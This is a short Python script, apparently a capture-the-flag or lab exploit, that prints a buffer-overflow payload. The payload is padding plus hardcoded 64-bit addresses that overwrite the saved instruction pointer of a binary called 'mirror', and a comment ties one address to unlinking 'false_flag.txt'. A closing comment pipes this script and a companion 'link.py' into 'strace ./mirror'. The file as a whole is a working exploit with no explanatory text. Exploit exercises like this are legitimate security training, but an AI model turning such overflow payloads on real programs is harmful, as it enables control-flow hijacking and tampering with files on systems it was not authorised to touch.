#!/usr/bin/env python3

i = 16 
pad1 = 'A'*i
addr = '\x2a\x10\x40\x00\x00\x00\x00\x00'       # change rip
pad2 = '\x00\x20\x40\x00\x00\x00\x00\x00'       # unlink false_flag.txt       
pad3 = 'B'*i
pad4 = '\x00\x10\x40\x00\x00\x00\x00\x00'    
rip = '\x00\x10\x40\x00\x00\x00\x00\x00'       # change rip , jump to mirror
pad5 = 'D'*(86 - len(pad1) - len(addr) - len(pad2)-len(pad3) - len(pad4)-len(rip))
buff = pad1 + addr + pad2 + pad3 + pad4 + rip + pad5
print(buff)

# (./unlink.py && sleep 1 && ./link.py) | strace ./mirror